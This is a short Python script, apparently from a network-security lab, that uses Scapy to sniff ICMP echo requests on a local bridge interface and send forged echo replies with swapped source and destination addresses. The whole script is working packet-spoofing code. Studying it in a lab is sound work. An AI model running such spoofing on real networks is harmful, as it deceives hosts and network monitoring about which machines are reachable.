#!/usr/bin/env python3
from scapy.all import *

def spoofing(pkt):
	if ICMP in pkt and pkt[ICMP].type == 8:
		src=pkt[IP].src
		dst=pkt[IP].dst

		ip = IP(src=dst, dst=src, ihl = pkt[IP].ihl)
		icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
		data = pkt[Raw].load
		spofpkt = ip/icmp/data
		
		print("our spoofed packet")
		print("the spoofed source IP: ",spofpkt[IP].src)
		print("the spoofed destination IP: ",spofpkt[IP].dst)
		send(spofpkt,verbose=0,iface='br-d9129ac507fa')
print("starting to sniff")
pkt = sniff(iface='br-d9129ac507fa',filter="icmp", prn=spoofing)
